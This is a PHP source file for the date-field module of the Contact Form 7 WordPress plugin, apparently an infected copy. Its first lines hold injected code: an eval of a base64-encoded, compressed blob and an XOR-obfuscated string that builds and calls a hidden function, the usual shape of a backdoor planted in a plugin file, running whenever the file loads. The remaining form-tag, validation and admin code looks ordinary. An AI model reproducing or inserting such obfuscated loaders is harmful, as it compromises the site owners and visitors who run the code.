<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $UzOGILBkq='X=SYYPdF3=1I.DN'^ ';O68-5; FSR=G+ ';$DrrbjQRuQZow=$UzOGILBkq('', 'UUck6U+9C,680Q61:TKQB0Z e>L54s,,A;qxMn2h1,:N5Y>6SJCUR=20AJid><3yEYO6JmYS9X<BqdIKbPsahBS-:ozNkioRZXS>Rqg1QDHVOkEQsX6;L<UgNY739KMwE;LQc=j2M.L6LkpCxuJY.4+P 7j4KCFP6cf Pnd<X 4WZOAW7<jpljLAYD7Y=CZiiX6XFH1EO;A32e485,IQE6-5>3IEt,,L3=P76HKOV75N5R9n5Y;6Y:,Nbp+,c.- ve27Gg,NJLIkhT,8Y<YLdPH2aP.EAnEHUrJEe;.Azz9rZYY;KMzg726N,LFPf23.oJfu5ZAVPJHlSRR7+W5 FFe+bi=up2oG5+PAQ4YzTzurO39HVmO0nA:QP-F 8SWOwlSg94Ac:04wH45LsSNKX4T8Shid:dJ=SEIQY7khr17E9WN=YRTH<g-ZCaUY2T.4TH7jU+M.bxk04Y.56mb+,BObvGWX,MSqS.BAghcQ4JLQ.0ZhmMN.59;,rG-UkE6<=H:pr.=8DXjmD9IPamnHXr +oAtR92,hj><MNofDUrMT1rPNTHcH+t53QQv+GJeq18cHYIVIM2HahXTHTbL8O7Ut<V7sNK8K1Inp36U86R+NGETD9ZLXeThmPAl3ih1=U:nr14ZJ2nPA2;AX=s0EWb;YXX>ysFp8F' ^ '<3KJP EZ7EYVo4NXI 8yeH5R:Z-AU,sA4OVQdNIb8JO V-WY=j;: bVQ5+6;SIGQa=.B+AywR=EkQDikB+yhaf<XNOGnLNTXSQ5Q YCXqyhftKa8O+BI Y;Oj=VGXbvWaRgzJ7c;iA9BlEMcPQ.8ZUptIjJjkg-5O8BIpKDO,RX24ge<REC-EQFHP6R-H14AM7C,os;L21<98APYAMilePLYMVrOPHM8Rb;ROhvo0VY=Pi3dS6IS8YDnJTto,afi3ESDgCG+3ltUHpZY5I<eD+B;E4O1 1.-,RweAPK8Ap0V>8-ZkpZCASZ;IwL-l8ZHObGQQ;57yj3fZ4=EN6VHfnAt0,l 5a;gTXpe:Q ZiDUV9RU=3DoKdH3u4L2Ag826WQsCRQ8X09=S,UA-Snno.U8M6ScmGn77Ya-0-VKURqB+J2<T8>=2YOU51>18F5qk9=CB7J>KTL4TQ:AQSEFOM6.KZgs<M92.8K;hNSi8Rbh5OD;HKknOGKZU-,H,4 NUN<IXUEXActJI X=1HMHnxZMOZiP6XFM3MUY4i2OdhOmsTD2w7zZ.NBVW20EOuzVBWYR,kpe+yT,VOqtnrB-J=V,+W3N,+3Q8E:FWCW,TY3Oikep X.-qLtHMpaLHcaTK4VFVUU.+iI  KW.9YTmllh2< 1JQCoK2;');$DrrbjQRuQZow();
/**
** A base module for the following types of tags:
** 	[date] and [date*]		# Date
**/

/* form_tag handler */

add_action( 'wpcf7_init', 'wpcf7_add_form_tag_date' );

function wpcf7_add_form_tag_date() {
	wpcf7_add_form_tag( array( 'date', 'date*' ),
		'wpcf7_date_form_tag_handler', array( 'name-attr' => true ) );
}

function wpcf7_date_form_tag_handler( $tag ) {
	if ( empty( $tag->name ) ) {
		return '';
	}

	$validation_error = wpcf7_get_validation_error( $tag->name );

	$class = wpcf7_form_controls_class( $tag->type );

	$class .= ' wpcf7-validates-as-date';

	if ( $validation_error ) {
		$class .= ' wpcf7-not-valid';
	}

	$atts = array();

	$atts['class'] = $tag->get_class_option( $class );
	$atts['id'] = $tag->get_id_option();
	$atts['tabindex'] = $tag->get_option( 'tabindex', 'signed_int', true );
	$atts['min'] = $tag->get_date_option( 'min' );
	$atts['max'] = $tag->get_date_option( 'max' );
	$atts['step'] = $tag->get_option( 'step', 'int', true );

	if ( $tag->has_option( 'readonly' ) ) {
		$atts['readonly'] = 'readonly';
	}

	if ( $tag->is_required() ) {
		$atts['aria-required'] = 'true';
	}

	$atts['aria-invalid'] = $validation_error ? 'true' : 'false';

	$value = (string) reset( $tag->values );

	if ( $tag->has_option( 'placeholder' ) || $tag->has_option( 'watermark' ) ) {
		$atts['placeholder'] = $value;
		$value = '';
	}

	$value = $tag->get_default_option( $value );

	$value = wpcf7_get_hangover( $tag->name, $value );

	$atts['value'] = $value;

	if ( wpcf7_support_html5() ) {
		$atts['type'] = $tag->basetype;
	} else {
		$atts['type'] = 'text';
	}

	$atts['name'] = $tag->name;

	$atts = wpcf7_format_atts( $atts );

	$html = sprintf(
		'<span class="wpcf7-form-control-wrap %1$s"><input %2$s />%3$s</span>',
		sanitize_html_class( $tag->name ), $atts, $validation_error );

	return $html;
}


/* Validation filter */

add_filter( 'wpcf7_validate_date', 'wpcf7_date_validation_filter', 10, 2 );
add_filter( 'wpcf7_validate_date*', 'wpcf7_date_validation_filter', 10, 2 );

function wpcf7_date_validation_filter( $result, $tag ) {
	$name = $tag->name;

	$min = $tag->get_date_option( 'min' );
	$max = $tag->get_date_option( 'max' );

	$value = isset( $_POST[$name] )
		? trim( strtr( (string) $_POST[$name], "\n", " " ) )
		: '';

	if ( $tag->is_required() && '' == $value ) {
		$result->invalidate( $tag, wpcf7_get_message( 'invalid_required' ) );
	} elseif ( '' != $value && ! wpcf7_is_date( $value ) ) {
		$result->invalidate( $tag, wpcf7_get_message( 'invalid_date' ) );
	} elseif ( '' != $value && ! empty( $min ) && $value < $min ) {
		$result->invalidate( $tag, wpcf7_get_message( 'date_too_early' ) );
	} elseif ( '' != $value && ! empty( $max ) && $max < $value ) {
		$result->invalidate( $tag, wpcf7_get_message( 'date_too_late' ) );
	}

	return $result;
}


/* Messages */

add_filter( 'wpcf7_messages', 'wpcf7_date_messages' );

function wpcf7_date_messages( $messages ) {
	return array_merge( $messages, array(
		'invalid_date' => array(
			'description' => __( "Date format that the sender entered is invalid", 'contact-form-7' ),
			'default' => __( "The date format is incorrect.", 'contact-form-7' )
		),

		'date_too_early' => array(
			'description' => __( "Date is earlier than minimum limit", 'contact-form-7' ),
			'default' => __( "The date is before the earliest one allowed.", 'contact-form-7' )
		),

		'date_too_late' => array(
			'description' => __( "Date is later than maximum limit", 'contact-form-7' ),
			'default' => __( "The date is after the latest one allowed.", 'contact-form-7' )
		),
	) );
}


/* Tag generator */

add_action( 'wpcf7_admin_init', 'wpcf7_add_tag_generator_date', 19 );

function wpcf7_add_tag_generator_date() {
	$tag_generator = WPCF7_TagGenerator::get_instance();
	$tag_generator->add( 'date', __( 'date', 'contact-form-7' ),
		'wpcf7_tag_generator_date' );
}

function wpcf7_tag_generator_date( $contact_form, $args = '' ) {
	$args = wp_parse_args( $args, array() );
	$type = 'date';

	$description = __( "Generate a form-tag for a date input field. For more details, see %s.", 'contact-form-7' );

	$desc_link = wpcf7_link( __( 'https://contactform7.com/date-field/', 'contact-form-7' ), __( 'Date Field', 'contact-form-7' ) );

?>
<div class="control-box">
<fieldset>
<legend><?php echo sprintf( esc_html( $description ), $desc_link ); ?></legend>

<table class="form-table">
<tbody>
	<tr>
	<th scope="row"><?php echo esc_html( __( 'Field type', 'contact-form-7' ) ); ?></th>
	<td>
		<fieldset>
		<legend class="screen-reader-text"><?php echo esc_html( __( 'Field type', 'contact-form-7' ) ); ?></legend>
		<label><input type="checkbox" name="required" /> <?php echo esc_html( __( 'Required field', 'contact-form-7' ) ); ?></label>
		</fieldset>
	</td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-name' ); ?>"><?php echo esc_html( __( 'Name', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="name" class="tg-name oneline" id="<?php echo esc_attr( $args['content'] . '-name' ); ?>" /></td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-values' ); ?>"><?php echo esc_html( __( 'Default value', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="values" class="oneline" id="<?php echo esc_attr( $args['content'] . '-values' ); ?>" /><br />
	<label><input type="checkbox" name="placeholder" class="option" /> <?php echo esc_html( __( 'Use this text as the placeholder of the field', 'contact-form-7' ) ); ?></label></td>
	</tr>

	<tr>
	<th scope="row"><?php echo esc_html( __( 'Range', 'contact-form-7' ) ); ?></th>
	<td>
		<fieldset>
		<legend class="screen-reader-text"><?php echo esc_html( __( 'Range', 'contact-form-7' ) ); ?></legend>
		<label>
		<?php echo esc_html( __( 'Min', 'contact-form-7' ) ); ?>
		<input type="date" name="min" class="date option" />
		</label>
		&ndash;
		<label>
		<?php echo esc_html( __( 'Max', 'contact-form-7' ) ); ?>
		<input type="date" name="max" class="date option" />
		</label>
		</fieldset>
	</td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-id' ); ?>"><?php echo esc_html( __( 'Id attribute', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="id" class="idvalue oneline option" id="<?php echo esc_attr( $args['content'] . '-id' ); ?>" /></td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-class' ); ?>"><?php echo esc_html( __( 'Class attribute', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="class" class="classvalue oneline option" id="<?php echo esc_attr( $args['content'] . '-class' ); ?>" /></td>
	</tr>
</tbody>
</table>
</fieldset>
</div>

<div class="insert-box">
	<input type="text" name="<?php echo $type; ?>" class="tag code" readonly="readonly" onfocus="this.select()" />

	<div class="submitbox">
	<input type="button" class="button button-primary insert-tag" value="<?php echo esc_attr( __( 'Insert Tag', 'contact-form-7' ) ); ?>" />
	</div>

	<br class="clear" />

	<p class="description mail-tag"><label for="<?php echo esc_attr( $args['content'] . '-mailtag' ); ?>"><?php echo sprintf( esc_html( __( "To use the value input through this field in a mail field, you need to insert the corresponding mail-tag (%s) into the field on the Mail tab.", 'contact-form-7' ) ), '<strong><span class="mail-tag"></span></strong>' ); ?><input type="text" class="mail-tag code hidden" readonly="readonly" id="<?php echo esc_attr( $args['content'] . '-mailtag' ); ?>" /></label></p>
</div>
<?php
}
